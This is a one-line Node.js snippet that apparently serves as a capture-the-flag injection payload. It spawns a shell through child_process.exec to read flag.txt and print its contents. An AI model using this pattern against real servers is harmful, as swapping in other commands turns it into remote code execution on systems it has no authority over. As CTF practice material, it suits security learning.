require("child_process").exec("cat flag.txt", function(error, stdout, stderr){console.log(stdout);});
